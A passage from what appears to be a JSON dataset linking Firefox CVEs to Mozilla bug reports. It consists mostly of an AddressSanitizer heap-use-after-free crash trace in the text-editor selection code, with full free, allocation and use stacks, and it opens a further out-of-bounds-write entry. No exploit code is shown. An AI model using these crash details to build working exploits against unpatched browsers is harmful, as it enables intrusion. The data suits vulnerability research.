nsFrameSelection::TakeFocus(nsIContent*, unsigned int, unsigned int, mozilla::CaretAssociationHint, bool, bool) /builds/worker/workspace/build/src/layout/generic/nsFrameSelection.cpp #27 0x7f83dff92982 in nsFrameSelection::MoveCaret(nsDirection, bool, nsSelectionAmount, nsFrameSelection::CaretMovementStyle) /builds/worker/workspace/build/src/layout/generic/nsFrameSelection.cpp:910:14 #28 0x7f83dff9dd49 in nsFrameSelection::PhysicalMove(short, short, bool) /builds/worker/workspace/build/src/layout/generic/nsFrameSelection.cpp:1892:17 #29 0x7f83ddc96675 in nsTextInputSelectionImpl::PhysicalMove(short, short, bool) /builds/worker/workspace/build/src/dom/html/nsTextEditorState.cpp:565:28 #30 0x7f83df5e6b3e in mozilla::SelectionMoveCommands::DoCommand(char const*, nsISupports*) /builds/worker/workspace/build/src/editor/libeditor/EditorCommands.cpp #31 0x7f83dd73ed60 in nsControllerCommandTable::DoCommand(char const*, nsISupports*) /builds/worker/workspace/build/src/dom/commandhandler/nsControllerCommandTable.cpp:147:26 #32 0x7f83dd734a26 in nsBaseCommandController::DoCommand(char const*) /builds/worker/workspace/build/src/dom/commandhandler/nsBaseCommandController.cpp:136:25 #33 0x7f83df00182c in nsXBLPrototypeHandler::DispatchXBLCommand(mozilla::dom::EventTarget*, nsIDOMEvent*) /builds/worker/workspace/build/src/dom/xbl/nsXBLPrototypeHandler.cpp:568:17 #34 0x7f83defd42de in nsXBLPrototypeHandler::ExecuteHandler(mozilla::dom::EventTarget*, nsIDOMEvent*) /builds/worker/workspace/build/src/dom/xbl/nsXBLPrototypeHandler.cpp:285:12 #35 0x7f83df01f1ed in nsXBLWindowKeyHandler::WalkHandlersAndExecute(nsIDOMKeyEvent*, nsAtom*, nsXBLPrototypeHandler*, unsigned int, mozilla::IgnoreModifierState const&, bool, bool*) /builds/worker/workspace/build/src/dom/xbl/nsXBLWindowKeyHandler.cpp:793:28 #36 0x7f83df018d86 in nsXBLWindowKeyHandler::WalkHandlersInternal(nsIDOMKeyEvent*, nsAtom*, nsXBLPrototypeHandler*, bool, bool*) /builds/worker/workspace/build/src/dom/xbl/nsXBLWindowKeyHandler.cpp:647:12 #37 0x7f83df01875e in nsXBLWindowKeyHandler::WalkHandlers(nsIDOMKeyEvent*, nsAtom*) /builds/worker/workspace/build/src/dom/xbl/nsXBLWindowKeyHandler.cpp:303:3 #38 0x7f83df01e034 in nsXBLWindowKeyHandler::HandleEvent(nsIDOMEvent*) /builds/worker/workspace/build/src/dom/xbl/nsXBLWindowKeyHandler.cpp:527:10 #39 0x7f83dd869121 in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1111:51 #40 0x7f83dd86b032 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1286:20 #41 0x7f83dd854a33 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:520:14 #42 0x7f83dd854dc6 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:549:5 #43 0x7f83dd8581b8 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:865:9 #44 0x7f83dd85a0cc in mozilla::EventDispatcher::DispatchDOMEvent(nsISupports*, mozilla::WidgetEvent*, nsIDOMEvent*, nsPresContext*, nsEventStatus*) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:932:12 #45 0x7f83db49a3bf in nsINode::DispatchEvent(nsIDOMEvent*, bool*) /builds/worker/workspace/build/src/dom/base/nsINode.cpp:1359:5 #46 0x7f83dd878571 in mozilla::dom::EventTarget::DispatchEvent(mozilla::dom::Event&, mozilla::dom::CallerType, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/events/EventTarget.cpp:102:9 #47 0x7f83dcdf8043 in mozilla::dom::EventTargetBinding::dispatchEvent(JSContext*, JS::Handle<JSObject*>, mozilla::dom::EventTarget*, JSJitMethodCallArgs const&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/EventTargetBinding.cpp:981:21 #48 0x7f83dcdf54a6 in mozilla::dom::EventTargetBinding::genericMethod(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/EventTargetBinding.cpp:1157:13 #49 0x7f83e3df6a34 in CallJSNative /builds/worker/workspace/build/src/js/src/jscntxtinlines.h:291:15 #50 0x7f83e3df6a34 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:473 #51 0x7f83e3de1a66 in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:528:12 #52 0x7f83e3de1a66 in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3096 #53 0x7f83e3dc8410 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:423:12 #54 0x7f83e3df6f6c in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:495:15 #55 0x7f83e3df7a92 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:541:10 #56 0x7f83e48db5f1 in JS_CallFunctionValue(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jsapi.cpp:2970:12 #57 0x7f83d9b49302 in xpc::FunctionForwarder(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/js/xpconnect/src/ExportHelpers.cpp:315:18 #58 0x7f83e3df6a34 in CallJSNative /builds/worker/workspace/build/src/js/src/jscntxtinlines.h:291:15 #59 0x7f83e3df6a34 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:473 #60 0x7f83e3de1a66 in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:528:12 #61 0x7f83e3de1a66 in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3096 #62 0x7f83e3dc8410 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:423:12 #63 0x7f83e3df6f6c in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:495:15 #64 0x7f83e3df7a92 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:541:10 #65 0x7f83e48dda6c in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jsapi.cpp:3029:12 #66 0x7f83dccfe65e in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:260:37 #67 0x7f83dd8a293a in Call<nsISupports *> /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventHandlerBinding.h:362:12 #68 0x7f83dd8a293a in mozilla::JSEventHandler::HandleEvent(nsIDOMEvent*) /builds/worker/workspace/build/src/dom/events/JSEventHandler.cpp:215 #69 0x7f83dd869121 in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1111:51 #70 0x7f83dd86b032 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1286:20 #71 0x7f83dd854a33 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:520:14 #72 0x7f83dd8581b8 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:865:9 #73 0x7f83dd85a0cc in mozilla::EventDispatcher::DispatchDOMEvent(nsISupports*, mozilla::WidgetEvent*, nsIDOMEvent*, nsPresContext*, nsEventStatus*) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:932:12 #74 0x7f83db49a3bf in nsINode::DispatchEvent(nsIDOMEvent*, bool*) /builds/worker/workspace/build/src/dom/base/nsINode.cpp:1359:5 #75 0x7f83dd7e1b33 in mozilla::AsyncEventDispatcher::Run() /builds/worker/workspace/build/src/dom/events/AsyncEventDispatcher.cpp:70:12 #76 0x7f83d821ca70 in mozilla::SchedulerGroup::Runnable::Run() /builds/worker/workspace/build/src/xpcom/threads/SchedulerGroup.cpp:395:25 #77 0x7f83d8244c5d in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1040:14 #78 0x7f83d825fa30 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:517:10 #79 0x7f83d90ea83a in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:97:21 #80 0x7f83d9042139 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:326:10 #81 0x7f83d9042139 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:319 #82 0x7f83d9042139 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:299 #83 0x7f83df463dea in nsBaseAppShell::Run() /builds/worker/workspace/build/src/widget/nsBaseAppShell.cpp:157:27 #84 0x7f83e3b1fedb in XRE_RunAppShell() /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:874:22 #85 0x7f83d9042139 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:326:10 #86 0x7f83d9042139 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:319 #87 0x7f83d9042139 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:299 #88 0x7f83e3b1f8c1 in XRE_InitChildProcess(int, char**, XREChildData const*) /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:700:34 #89 0x4ee915 in content_process_main /builds/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:63:30 #90 0x4ee915 in main /builds/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:280 #91 0x7f83f701382f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f) #92 0x41dfe8 in _start (/fuzzer3/firefox/firefox+0x41dfe8) 0x60c0002788e8 is located 40 bytes inside of 128-byte region [0x60c0002788c0,0x60c000278940) freed by thread T0 (file:// Content) here: #0 0x4be9f2 in __interceptor_free /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:68:3 #1 0x7f83ddad7317 in operator delete /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:183:12 #2 0x7f83ddad7317 in ReleaseTextEditorState /builds/worker/workspace/build/src/dom/html/HTMLInputElement.cpp:1106 #3 0x7f83ddad7317 in mozilla::dom::HTMLInputElement::FreeData() /builds/worker/workspace/build/src/dom/html/HTMLInputElement.cpp:1195 #4 0x7f83ddadef49 in mozilla::dom::HTMLInputElement::HandleTypeChange(unsigned char, bool) /builds/worker/workspace/build/src/dom/html/HTMLInputElement.cpp:4951:3 #5 0x7f83ddadc255 in mozilla::dom::HTMLInputElement::AfterSetAttr(int, nsAtom*, nsAttrValue const*, nsAttrValue const*, nsIPrincipal*, bool) /builds/worker/workspace/build/src/dom/html/HTMLInputElement.cpp:1431:9 #6 0x7f83db198193 in mozilla::dom::Element::SetAttrAndNotify(int, nsAtom*, nsAtom*, nsAttrValue const*, nsAttrValue&, nsIPrincipal*, unsigned char, bool, bool, bool, nsIDocument*, mozAutoDocUpdate const&) /builds/worker/workspace/build/src/dom/base/Element.cpp:2773:10 #7 0x7f83db18c42a in mozilla::dom::Element::SetAttr(int, nsAtom*, nsAtom*, nsTSubstring<char16_t> const&, nsIPrincipal*, bool) /builds/worker/workspace/build/src/dom/base/Element.cpp:2615:10 #8 0x7f83dd10d58d in SetAttr /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/Element.h:889:12 #9 0x7f83dd10d58d in SetAttr /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/Element.h:884 #10 0x7f83dd10d58d in SetAttr /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/Element.h:1645 #11 0x7f83dd10d58d in SetHTMLAttr /builds/worker/workspace/build/src/dom/html/nsGenericHTMLElement.h:814 #12 0x7f83dd10d58d in SetType /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/HTMLInputElement.h:738 #13 0x7f83dd10d58d in mozilla::dom::HTMLInputElementBinding::set_type(JSContext*, JS::Handle<JSObject*>, mozilla::dom::HTMLInputElement*, JSJitSetterCallArgs) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/HTMLInputElementBinding.cpp:2470 #14 0x7f83dd3ae439 in mozilla::dom::GenericBindingSetter(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:2997:8 #15 0x7f83e3df6a34 in CallJSNative /builds/worker/workspace/build/src/js/src/jscntxtinlines.h:291:15 #16 0x7f83e3df6a34 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:473 #17 0x7f83e3df9186 in InternalCall /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:522:12 #18 0x7f83e3df9186 in Call /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:541 #19 0x7f83e3df9186 in js::CallSetter(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::Handle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:670 #20 0x7f83e4ea037c in SetExistingProperty(JSContext*, JS::Handle<js::NativeObject*>, JS::Handle<jsid>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::Handle<js::NativeObject*>, JS::Handle<JS::PropertyResult>, JS::ObjectOpResult&) /builds/worker/workspace/build/src/js/src/vm/NativeObject.cpp:2736:10 #21 0x7f83e4e9679c in bool js::NativeSetProperty<(js::QualifiedBool)1>(JSContext*, JS::Handle<js::NativeObject*>, JS::Handle<jsid>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::ObjectOpResult&) /builds/worker/workspace/build/src/js/src/vm/NativeObject.cpp:2764:20 #22 0x7f83e3dda04a in SetProperty /builds/worker/workspace/build/src/js/src/vm/NativeObject.h:1637:12 #23 0x7f83e3dda04a in SetPropertyOperation /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:270 #24 0x7f83e3dda04a in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2893 #25 0x7f83e3dc8410 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:423:12 #26 0x7f83e3df6f6c in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:495:15 #27 0x7f83e3df7a92 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:541:10 #28 0x7f83e48dda6c in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jsapi.cpp:3029:12 #29 0x7f83dccfe65e in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:260:37 #30 0x7f83dd8a293a in Call<nsISupports *> /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventHandlerBinding.h:362:12 #31 0x7f83dd8a293a in mozilla::JSEventHandler::HandleEvent(nsIDOMEvent*) /builds/worker/workspace/build/src/dom/events/JSEventHandler.cpp:215 #32 0x7f83dd869121 in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1111:51 #33 0x7f83dd86b032 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1286:20 #34 0x7f83dd854a33 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:520:14 #35 0x7f83dd8581b8 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:865:9 #36 0x7f83dd85a0cc in mozilla::EventDispatcher::DispatchDOMEvent(nsISupports*, mozilla::WidgetEvent*, nsIDOMEvent*, nsPresContext*, nsEventStatus*) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:932:12 #37 0x7f83db49a3bf in nsINode::DispatchEvent(nsIDOMEvent*, bool*) /builds/worker/workspace/build/src/dom/base/nsINode.cpp:1359:5 #38 0x7f83daf9850e in nsContentUtils::DispatchEvent(nsIDocument*, nsISupports*, nsTSubstring<char16_t> const&, bool, bool, bool, bool*, bool) /builds/worker/workspace/build/src/dom/base/nsContentUtils.cpp:4506:18 #39 0x7f83daf982c4 in nsContentUtils::DispatchTrustedEvent(nsIDocument*, nsISupports*, nsTSubstring<char16_t> const&, bool, bool, bool*) /builds/worker/workspace/build/src/dom/base/nsContentUtils.cpp:4474:10 #40 0x7f83db23db58 in mozilla::dom::Selection::AddItem(nsRange*, int*, bool) /builds/worker/workspace/build/src/dom/base/Selection.cpp:1130:11 #41 0x7f83db2532c0 in mozilla::dom::Selection::AddRangeInternal(nsRange&, nsIDocument*, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/base/Selection.cpp:2359:14 #42 0x7f83db252cc4 in AddRange /builds/worker/workspace/build/src/dom/base/Selection.cpp:2325:10 #43 0x7f83db252cc4 in mozilla::dom::Selection::AddRange(nsIDOMRange*) /builds/worker/workspace/build/src/dom/base/Selection.cpp:2310 previously allocated by thread T0 (file:// Content) here: #0 0x4bed33 in malloc /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:88:3 #1 0x4ef79d in moz_xmalloc /builds/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:70:17 #2 0x7f83ddc9b70a in operator new /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:159:12 #3 0x7f83ddc9b70a in nsTextEditorState::Construct(nsITextControlElement*, nsTextEditorState**) /builds/worker/workspace/build/src/dom/html/nsTextEditorState.cpp:1179 #4 0x7f83ddad66ce in mozilla::dom::HTMLInputElement::HTMLInputElement(already_AddRefed<mozilla::dom::NodeInfo>&, mozilla::dom::FromParser, mozilla::dom::HTMLInputElement::FromClone) /builds/worker/workspace/build/src/dom/html/HTMLInputElement.cpp:1159:5 #5 0x7f83ddac7aec in NS_NewHTMLInputElement(already_AddRefed<mozilla::dom::NodeInfo>&&, mozilla::dom::FromParser) /builds/worker/workspace/build/src/dom/html/HTMLInputElement.cpp:124:1 #6 0x7f83ddc61b2d in CreateHTMLElement(unsigned int, already_AddRefed<mozilla::dom::NodeInfo>&&, mozilla::dom::FromParser) /builds/worker/workspace/build/src/dom/html/nsHTMLContentSink.cpp:254:41 #7 0x7f83dafcc73a in nsContentUtils::NewXULOrHTMLElement(mozilla::dom::Element**, mozilla::dom::NodeInfo*, mozilla::dom::FromParser, nsAtom*, mozilla::dom::CustomElementDefinition*) /builds/worker/workspace/build/src/dom/base/nsContentUtils.cpp:10110:18 #8 0x7f83ddc61a88 in NS_NewHTMLElement(mozilla::dom::Element**, already_AddRefed<mozilla::dom::NodeInfo>&&, mozilla::dom::FromParser, nsAtom*, mozilla::dom::CustomElementDefinition*) /builds/worker/workspace/build/src/dom/html/nsHTMLContentSink.cpp:237:10 #9 0x7f83db4e94be in NS_NewElement(mozilla::dom::Element**, already_AddRefed<mozilla::dom::NodeInfo>&&, mozilla::dom::FromParser, nsTSubstring<char16_t> const*) /builds/worker/workspace/build/src/dom/base/nsNameSpaceManager.cpp:183:12 #10 0x7f83db3c78d1 in nsDocument::CreateElem(nsTSubstring<char16_t> const&, nsAtom*, int, nsTSubstring<char16_t> const*) /builds/worker/workspace/build/src/dom/base/nsDocument.cpp:8506:17 #11 0x7f83db3ae577 in nsDocument::CreateElement(nsTSubstring<char16_t> const&, mozilla::dom::ElementCreationOptionsOrString const&, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/base/nsDocument.cpp:5946:26 #12 0x7f83dcd45d9c in mozilla::dom::DocumentBinding::createElement(JSContext*, JS::Handle<JSObject*>, nsIDocument*, JSJitMethodCallArgs const&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/DocumentBinding.cpp:1229:59 #13 0x7f83dd3aed87 in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:3036:13 #14 0x7f83e3df6a34 in CallJSNative /builds/worker/workspace/build/src/js/src/jscntxtinlines.h:291:15 #15 0x7f83e3df6a34 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:473 #16 0x7f83e3de1a66 in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:528:12 #17 0x7f83e3de1a66 in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3096 #18 0x7f83e3dc8410 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:423:12 #19 0x7f83e3df6f6c in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:495:15 #20 0x7f83e3df7a92 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:541:10 #21 0x7f83e48dda6c in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jsapi.cpp:3029:12 #22 0x7f83dccfe65e in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:260:37 #23 0x7f83dd8a293a in Call<nsISupports *> /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventHandlerBinding.h:362:12 #24 0x7f83dd8a293a in mozilla::JSEventHandler::HandleEvent(nsIDOMEvent*) /builds/worker/workspace/build/src/dom/events/JSEventHandler.cpp:215 #25 0x7f83dd869121 in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1111:51 #26 0x7f83dd86b032 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1286:20 #27 0x7f83dd854792 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:496:16 #28 0x7f83dd8581b8 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:865:9 #29 0x7f83dfd40f78 in nsDocumentViewer::LoadComplete(nsresult) /builds/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:1072:7 #30 0x7f83e307354d in nsDocShell::EndPageLoad(nsIWebProgress*, nsIChannel*, nsresult) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7259:21 #31 0x7f83e306f5fa in nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7052:7 #32 0x7f83e307726f in non-virtual thunk to nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp #33 0x7f83da108837 in nsDocLoader::DoFireOnStateChange(nsIWebProgress*, nsIRequest*, int&, nsresult) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:1319:3 SUMMARY: AddressSanitizer: heap-use-after-free /builds/worker/workspace/build/src/dom/html/nsTextEditorState.cpp:1799:10 in nsTextEditorState::SetSelectionRange(unsigned int, unsigned int, nsITextControlFrame::SelectionDirection, mozilla::ErrorResult&) Shadow bytes around the buggy address: 0x0c18800470c0: fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa 0x0c18800470d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c18800470e0: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd 0x0c18800470f0: fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa 0x0c1880047100: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 =>0x0c1880047110: fa fa fa fa fa fa fa fa fd fd fd fd fd[fd]fd fd 0x0c1880047120: fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa 0x0c1880047130: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c1880047140: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd 0x0c1880047150: fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa 0x0c1880047160: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==31055==ABORTING"
      }
    ],
    "CVE-2018-5129": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1428947",
        "title": "OOB Write in CopyPlane within ImageContainer.cpp",
